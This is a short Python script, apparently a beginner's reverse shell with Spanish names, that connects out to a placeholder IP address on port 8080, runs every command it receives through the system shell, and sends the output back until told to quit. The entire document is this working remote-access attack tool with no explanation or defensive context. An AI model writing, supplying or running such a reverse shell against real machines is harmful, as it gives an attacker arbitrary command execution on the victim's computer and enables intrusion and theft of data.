import socket
import subprocess

def conexion():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('Direccion IP',8080))

	while True:
		command = s.recv(1024)
		if 'quit' in command:
			s.close()
			break
		else:
			cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			s.send(cmd.stdout.read())
			s.send(cmd.stderr.read())

def main():
	conexion()

if __name__ == '__main__':
	main()
